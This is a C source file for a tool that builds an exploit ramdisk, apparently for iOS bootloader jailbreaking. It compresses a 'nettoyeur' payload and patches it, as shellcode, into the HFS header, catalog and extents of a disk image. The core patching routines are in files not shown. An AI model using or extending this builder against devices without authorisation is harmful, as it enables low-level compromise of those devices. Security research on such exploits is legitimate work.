/*
 * make_rdskF.c
 * Copyright (c) 2020 @dora2_yururi
 *
 * [BUILD]
 * gcc make_rdskF.c lzss.c -o make_rdskF
 *
 * [How to use]
 * ./make_rdskF ramdisk3.dmg <outFile> [nettoyeur]
 *
 */

#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <assert.h>

#include "asm.h"
#include "endian.h"
#include "lzss.h"

#include "target/offset.h"

int open_file(char *file, size_t *sz, void **buf){
    FILE *fd = fopen(file, "r");
    if (!fd) {
        printf("error opening %s\n", file);
        return -1;
    }
    
    fseek(fd, 0, SEEK_END);
    *sz = ftell(fd);
    fseek(fd, 0, SEEK_SET);
    
    *buf = malloc(*sz);
    if (!*buf) {
        printf("error allocating file buffer\n");
        fclose(fd);
        return -1;
    }
    
    fread(*buf, *sz, 1, fd);
    fclose(fd);
    
    return 0;
}

int main(int argc, char **argv){
    
    if(argc != 4){
        printf("** fix shellcode addr [alpha]\n");
        printf("%s <in> <out> [nettoyeur]\n", argv[0]);
        return 0;
    }
    
    char *infile = argv[1];
    char *outfile = argv[2];
    char *netto = argv[3];
    
    void *rdsk;
    void *nettoyeur;
    size_t rdsk_sz;
    size_t nettoyeur_sz;
    
    /* ramdisk */
    printf("reading ramdisk\n");
    open_file(infile, &rdsk_sz, &rdsk);
    assert(rdsk_sz == 0x80000);
    
    /* nettoyeur */
    printf("read nettoyeur\n");
    open_file(netto, &nettoyeur_sz, &nettoyeur);
    unsigned char nettoyeur_lzss[256];
    unsigned char *end;
    unsigned int nettoyeur_lzss_sz;
    printf("compress lzss\n");
    end = compress_lzss(nettoyeur_lzss, sizeof(nettoyeur_lzss), nettoyeur, nettoyeur_sz);
    nettoyeur_lzss_sz = end - nettoyeur_lzss;
    
    assert(nettoyeur_lzss_sz <= 230);

    /* fix shellcode */
    printf("fix shellcode\n");
    void *header = malloc(0x200);
    void *catalog = malloc(0x100);
    void *extents = malloc(0x100);
    
    memcpy(header, rdsk+0x400, 0x200);
    memcpy(catalog, rdsk+0x8800, 0x100);
    memcpy(extents, rdsk+0x800, 0x100);
    
    patch_header(header);
    patch_catalog(catalog, nettoyeur_lzss, nettoyeur_lzss_sz);
    patch_extents(extents, nettoyeur_lzss, nettoyeur_lzss_sz);
    
    memcpy(rdsk+0x400, header, 0x200);
    memcpy(rdsk+0x8800, catalog, 0x100);
    memcpy(rdsk+0x800, extents, 0x100);
    
    /* write */
    FILE *out = fopen(outfile, "w");
    if (!out) {
        printf("error opening %s\n", outfile);
        return -1;
    }
    
    fwrite(rdsk, rdsk_sz, 1, out);
    fflush(out);
    fclose(out);
    
    free(rdsk);
    free(nettoyeur);
    
    return 0;
}
